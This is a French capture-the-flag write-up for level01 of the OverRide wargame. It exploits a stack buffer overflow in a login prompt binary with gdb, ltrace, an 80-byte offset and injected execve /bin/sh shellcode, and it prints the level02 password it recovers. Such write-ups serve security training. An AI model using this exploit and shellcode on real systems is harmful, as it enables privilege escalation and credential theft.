on a un exécutable qui affiche un prompt, on doit saisir un username et un password

après un coup d'oeil avec gdb on voit que l'username attendu est "dat_wil" et le password est "admin", mais le programme ne fait rien de plus

```
0x0804847d <+25>:    mov    $0x80486a8,%eax

(gdb) x/s 0x80486a8
0x80486a8:       "dat_wil"

0x080484ad <+10>:    mov    $0x80486b0,%eax

(gdb) x/s 0x80486b0
0x80486b0:       "admin"
```

après avoir désassemblé l'exécutable on observe qu'il n'y a aucun appel à un shell, on doit le faire nous-même avec un shellcode

on voit aussi que le fonction fgets() pour le password est vulnérable à un overflow car la fonction lit 100 caractères alors que le buffer a une taille de 32

le but de ce niveau est donc d'overflow en envoyant un shellcode

https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

avec le pattern generator on trouve un décalage de 80 octets :

```
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

*0x37634136 = 80*

ensuite on récupère l'adresse du buffer où est stocké le password :

```
level01@OverRide:~$ ltrace ./level01
__libc_start_main(0x80484d0, 1, -10284, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)   = 39
printf("Enter Username: ")                    = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)           = 0x0804a040
puts("verifying username....\n"verifying username....

)              = 24
puts("Enter Password: "Enter Password:
)                      = 17
fgets(admin
"admin\n", 100, 0xf7fcfac0)             = 0xffffd6ec
puts("nope, incorrect password...\n"nope, incorrect password...

)         = 29
+++ exited (status 1) +++
```

l'adresse du buffer est _0xffffd6ec_

il nous manque un shellcode : "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

https://shell-storm.org/shellcode/files/shellcode-827.html

notre attaque sera sous la forme : [username + '\n'] + [shellcode] + [57 bytes] + [buffer address]

on peut ensuite construire et lancer notre attaque :

```
level01@OverRide:~$ echo -e "dat_wil\n\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xec\xd6\xff\xff" > /tmp/overflow
level01@OverRide:~$ (cat /tmp/overflow ; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

pwd
/home/users/level01
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
